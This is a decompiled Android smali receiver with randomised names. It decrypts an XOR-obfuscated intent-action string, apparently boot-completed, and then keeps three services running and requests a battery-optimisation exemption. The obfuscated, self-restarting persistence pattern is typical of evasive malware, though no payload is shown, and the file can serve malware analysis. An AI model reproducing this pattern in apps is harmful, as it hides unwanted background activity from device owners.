.class public Lcom/vknnolqo/p9sv5zvf/TynQueAe;
.super Landroid/content/BroadcastReceiver;
.source "SourceFile"


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 2

    const/16 v0, 0x24

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v0, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_0

    invoke-static {p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/bq;->a(Landroid/content/Context;)V

    :cond_0
    const-class p2, Lcom/vknnolqo/p9sv5zvf/GJhyvSVC;

    invoke-static {p1, p2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ba;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v0

    const/16 v1, 0x1a

    if-nez v0, :cond_2

    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0, p1, p2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    sget p2, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt p2, v1, :cond_1

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v;->a(Landroid/content/Context;Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    :cond_1
    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_2
    :goto_0
    const-class p2, Lcom/vknnolqo/p9sv5zvf/GBPjHfKu;

    invoke-static {p1, p2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ba;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v0

    if-nez v0, :cond_4

    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0, p1, p2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    sget p2, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt p2, v1, :cond_3

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v;->a(Landroid/content/Context;Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_1

    :cond_3
    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_4
    :goto_1
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/y80;->b()Z

    move-result p2

    const-class v0, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;

    if-eqz p2, :cond_5

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ba;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result p2

    if-nez p2, :cond_7

    :cond_5
    new-instance p2, Landroid/content/Intent;

    invoke-direct {p2, p1, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v0, v1, :cond_6

    invoke-static {p1, p2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v;->a(Landroid/content/Context;Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_2

    :cond_6
    invoke-virtual {p1, p2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_7
    :goto_2

    # CZDKmH9g.requestIgnoreBatteryOptimization(context)
    :try_start_battery
    invoke-static {p1}, Lcom/vknnolqo/p9sv5zvf/CZDKmH9g;->requestIgnoreBatteryOptimization(Landroid/content/Context;)V
    :try_end_battery
    .catch Ljava/lang/Exception; {:try_start_battery .. :try_end_battery} :catch_battery

    :catch_battery
    return-void

    :array_0
    .array-data 1
        0x70t
        -0x3ct
        0x58t
        -0x15t
        -0x78t
        0x5bt
        -0x2bt
        -0x2ct
        0x78t
        -0x3ct
        0x48t
        -0x4t
        -0x77t
        0x46t
        -0x61t
        -0x65t
        0x72t
        -0x22t
        0x55t
        -0xat
        -0x77t
        0x1ct
        -0xdt
        -0x4bt
        0x5et
        -0x2t
        0x63t
        -0x26t
        -0x58t
        0x7ft
        -0x1ft
        -0x4at
        0x54t
        -0x2t
        0x79t
        -0x23t
    .end array-data

    :array_1
    .array-data 1
        0x11t
        -0x56t
        0x3ct
        -0x67t
        -0x19t
        0x32t
        -0x4ft
        -0x6t
    .end array-data
.end method
